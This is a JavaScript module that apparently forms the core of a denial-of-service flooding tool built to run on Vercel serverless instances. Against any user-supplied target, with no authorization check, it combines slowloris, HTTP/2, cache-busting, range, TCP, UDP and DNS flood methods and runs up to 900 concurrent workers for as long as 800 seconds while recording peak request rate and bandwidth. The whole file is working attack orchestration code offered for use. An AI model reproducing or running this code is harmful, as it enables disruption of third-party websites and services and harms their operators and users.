'use strict';

const dns = require('dns');
const METHODS = require('./methods');
const { Stats } = require('./stats');

// Vercel gives 1024 shared file descriptors per instance, minus runtime overhead.
const MAX_CONCURRENCY = 900;

const ALIASES = {
  get: 'http-get', httpget: 'http-get',
  post: 'http-post', httppost: 'http-post',
  head: 'http-head', httphead: 'http-head',
  h2: 'http2', http2: 'http2',
  slow: 'slowloris', slowloris: 'slowloris', slowhttp: 'slowloris',
  range: 'range', bytes: 'range',
  random: 'random', rand: 'random', cache: 'random', cachebuster: 'random',
  tcp: 'tcp', tcpconnect: 'tcp', connect: 'tcp',
  udp: 'udp',
  dns: 'dns', dnsq: 'dns',
};

const PRESETS = {
  mix: ['http-get', 'http-post', 'http-head', 'http2', 'range', 'random'],
  all: ['http-get', 'http-post', 'http-head', 'http2', 'slowloris', 'range', 'random', 'tcp', 'udp', 'dns'],
};

const clamp = (n, lo, hi) => Math.min(Math.max(n, lo), hi);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function resolveMethods(spec) {
  const raw = String(spec || 'http-get').toLowerCase().trim();
  if (PRESETS[raw]) return PRESETS[raw];

  const names = raw.split(/[,+\s]+/).filter(Boolean).map((token) => {
    const key = token.replace(/[^a-z0-9]/g, '');
    const canonical = ALIASES[key] || key;
    if (!METHODS[canonical]) {
      throw new Error(`Unknown method "${token}". Try: ${Object.keys(METHODS).join(', ')}, mix, all`);
    }
    return canonical;
  });

  return [...new Set(names)];
}

function parseTarget(input, opts = {}) {
  if (!input) throw new Error('A target is required.');

  let s = String(input).trim();
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(s)) s = `http://${s}`;

  let u;
  try { u = new URL(s); } catch { throw new Error(`Invalid target "${input}"`); }

  const secure = u.protocol === 'https:';
  const explicitPort = Boolean(u.port || opts.port);
  const port = opts.port ? Number(opts.port) : u.port ? Number(u.port) : secure ? 443 : 80;

  if (!Number.isFinite(port) || port < 1 || port > 65535) throw new Error(`Invalid port "${port}"`);

  return {
    input: String(input),
    scheme: u.protocol.replace(':', ''),
    secure,
    host: u.hostname,
    port,
    explicitPort,
    hostHeader: u.port ? `${u.hostname}:${u.port}` : u.hostname,
    path: `${u.pathname || '/'}${u.search || ''}`,
    ip: null,
  };
}

async function resolveTarget(input, opts) {
  const target = parseTarget(input, opts);
  target.ip = await new Promise((resolve) => {
    dns.lookup(target.host, { family: 0 }, (err, address) => resolve(err ? null : address));
  });
  return target;
}

function defaultConcurrency(methods) {
  const total = methods.reduce((acc, m) => acc + (METHODS[m].defaults.concurrency || 300), 0);
  return clamp(Math.round(total / methods.length), 1, MAX_CONCURRENCY);
}

async function run(opts, onTick) {
  const target = await resolveTarget(opts.target, opts);
  const methods = resolveMethods(opts.method);
  const concurrency = clamp(Number(opts.concurrency) || defaultConcurrency(methods), 1, MAX_CONCURRENCY);
  const duration = clamp(Number(opts.duration) || 15, 1, 800);

  const stats = new Stats();
  const ctx = { target, stats, opts, running: true };
  const perMethod = Math.max(1, Math.floor(concurrency / methods.length));

  const runners = [];
  const workers = [];

  for (const name of methods) {
    const runner = METHODS[name].create(ctx);
    runners.push({ name, runner });
    for (let i = 0; i < perMethod; i++) {
      workers.push(Promise.resolve().then(() => runner.worker(i)).catch(() => {}));
    }
  }

  let peakRps = 0;
  let peakBps = 0;
  const history = [];

  const ticker = setInterval(() => {
    const snap = stats.snapshot();
    peakRps = Math.max(peakRps, snap.rate.rps);
    peakBps = Math.max(peakBps, snap.rate.bps);
    history.push({
      t: Number(snap.uptime.toFixed(1)),
      rps: Math.round(snap.rate.rps),
      mbps: Number((snap.rate.bps / 1e6).toFixed(2)),
    });
    if (onTick) { try { onTick(snap); } catch {} }
  }, 1000);

  const startedAt = Date.now();
  await sleep(duration * 1000);
  ctx.running = false;

  for (const { runner } of runners) {
    if (typeof runner.destroy === 'function') { try { runner.destroy(); } catch {} }
  }
  await Promise.race([Promise.allSettled(workers), sleep(4000)]);
  clearInterval(ticker);

  const final = stats.snapshot();
  const elapsed = Math.max(1, (Date.now() - startedAt) / 1000);

  return {
    target: { input: target.input, host: target.host, ip: target.ip, port: target.port, secure: target.secure },
    methods,
    concurrency,
    socketsPlanned: perMethod * methods.length,
    durationSec: Number(elapsed.toFixed(2)),
    totals: {
      requests: final.total.reqs,
      errors: final.total.errors,
      bytesReceived: final.total.bytes,
      megabytesReceived: Number((final.total.bytes / 1048576).toFixed(2)),
      connectionsOpened: final.total.connsOpened,
    },
    averages: {
      rps: Math.round(final.total.reqs / elapsed),
      mbps: Number(((final.total.bytes * 8) / 1e6 / elapsed).toFixed(2)),
    },
    peak: {
      rps: Math.round(peakRps),
      mbps: Number((peakBps / 1e6).toFixed(2)),
    },
    history,
  };
}

module.exports = { run, parseTarget, resolveMethods, MAX_CONCURRENCY, METHODS };
